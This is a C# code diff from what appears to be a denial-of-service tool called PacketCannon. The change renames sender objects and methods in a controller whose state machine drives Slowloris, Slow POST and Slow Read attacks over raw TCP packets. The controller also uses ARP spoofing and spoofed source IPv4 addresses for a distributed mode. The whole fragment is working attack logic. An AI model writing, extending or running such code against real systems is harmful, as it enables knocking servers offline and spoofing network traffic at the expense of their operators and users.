@@ -18,7 +18,7 @@ namespace PacketCannon
 {
     public class DosController
     {
-        public ConcurrentBag<DosSender> SlowLorisSenders;
+        public ConcurrentBag<DosSender> dosSenders;
 
         public string SourceIpv4;
         public string DestinationIpV4 { get; set; }
@@ -83,11 +83,11 @@ namespace PacketCannon
                 ArpSpoofAddress(DdosCount, tester);
             }
 
-            SlowLorisSenders = new ConcurrentBag<DosSender>();
+            dosSenders = new ConcurrentBag<DosSender>();
 
             for (int i = 0; i < SenderSize; i++)
             {
-                SlowLorisSenders.Add(new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, HostAddress, SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
+                dosSenders.Add(new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, HostAddress, SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
             }
             var watcher = new Thread(SearchForPackets);
             watcher.Start();
@@ -95,13 +95,13 @@ namespace PacketCannon
             {
                 while (true)
                 {
-                    foreach (var slowLorisSender in SlowLorisSenders)
+                    foreach (var dosSender in dosSenders)
                     {
-                        switch (slowLorisSender.Status)
+                        switch (dosSender.Status)
                         {
                             case SenderStat.SendSyn:
-                                slowLorisSender.SendSyn(Communicator);
-                                slowLorisSender.Status = SenderStat.WaitingForAck;
+                                dosSender.SendSyn(Communicator);
+                                dosSender.Status = SenderStat.WaitingForAck;
                                 break;
                             //SLOW-READ
                             case SenderStat.RecievingSlowRead:
@@ -110,55 +110,55 @@ namespace PacketCannon
 
                             //SLOW-LORIS
                             case SenderStat.SendingAck when _attackMode == Attacks.SlowLoris:
-                                slowLorisSender.SendAck(Communicator);
-                                slowLorisSender.Status = SenderStat.SendingSlowLorisGetHeader;
+                                dosSender.SendAck(Communicator);
+                                dosSender.Status = SenderStat.SendingSlowLorisGetHeader;
                                 break;
 
                             //SLOW-POST
                             case SenderStat.SendingAck when _attackMode == Attacks.SlowPost:
-                                slowLorisSender.SendAck(Communicator);
-                                slowLorisSender.Status = SenderStat.SedingSlowPostHeader;
+                                dosSender.SendAck(Communicator);
+                                dosSender.Status = SenderStat.SedingSlowPostHeader;
                                 break;
 
                             //SLOW-READ
                             case SenderStat.SendingAck when _attackMode == Attacks.SlowRead:
-                                slowLorisSender.SendAck(Communicator);
-                                slowLorisSender.Status = SenderStat.SedingGetForSlowRead;
+                                dosSender.SendAck(Communicator);
+                                dosSender.Status = SenderStat.SedingGetForSlowRead;
                                 break;
 
                             //SLOW-LORIS
                             case SenderStat.SendingSlowLorisGetHeader:
-                                slowLorisSender.SendGetNotComplete(Communicator);
-                                slowLorisSender.Status = SenderStat.SendingKeepAliveForSlowLoris;
+                                dosSender.SendGetNotComplete(Communicator);
+                                dosSender.Status = SenderStat.SendingKeepAliveForSlowLoris;
                                 break;
 
                             //SLOW-LORIS
                             case SenderStat.SendingKeepAliveForSlowLoris:
-                                slowLorisSender.SendKeepAliveForSlowLoris(Communicator);
+                                dosSender.SendSlowLorisKeepAlive(Communicator);
                                 break;
 
                             //SLOW-POST
                             case SenderStat.SedingSlowPostHeader:
-                                slowLorisSender.SendSlowPostHeader(Communicator);
-                                slowLorisSender.Status = SenderStat.SedingKeepAliveForSlowPost;
+                                dosSender.SendSlowPostHeader(Communicator);
+                                dosSender.Status = SenderStat.SedingKeepAliveForSlowPost;
                                 break;
 
                             //SLOW-POST
                             case SenderStat.SedingKeepAliveForSlowPost:
-                                slowLorisSender.SendKeepAliveForSlowPost(Communicator);
+                                dosSender.SendSlowPostKeepAlive(Communicator);
                                 break;
 
                             //SLOW-READ
                             case SenderStat.SedingGetForSlowRead:
-                                slowLorisSender.WindowSize = (ushort)SlowReadWindowSize;
-                                slowLorisSender.SendCompleteGetForSlowRead(Communicator);
-                                slowLorisSender.Status = SenderStat.RecievingSlowRead;
+                                dosSender.WindowSize = (ushort)SlowReadWindowSize;
+                                dosSender.SendSlowReadCompleteGet(Communicator);
+                                dosSender.Status = SenderStat.RecievingSlowRead;
                                 break;
 
                             //SLOW-READ
                             case SenderStat.SendKeepAliveAckForSlowRead:
-                                slowLorisSender.Status = SenderStat.RecievingSlowRead;
-                                slowLorisSender.SendAck(Communicator);
+                                dosSender.Status = SenderStat.RecievingSlowRead;
+                                dosSender.SendAck(Communicator);
                                 break;
 
                             default:
@@ -183,8 +183,8 @@ namespace PacketCannon
                         DosSender a;
                         try
                         {
-                            a = Ddos ? SlowLorisSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort && FakeIpV4Addresses.Contains(packet.Ethernet.IpV4.Destination))
-                             : SlowLorisSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort);
+                            a = Ddos ? dosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort && FakeIpV4Addresses.Contains(packet.Ethernet.IpV4.Destination))
+                             : dosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort);
                         }
                         catch (Exception)
                         {
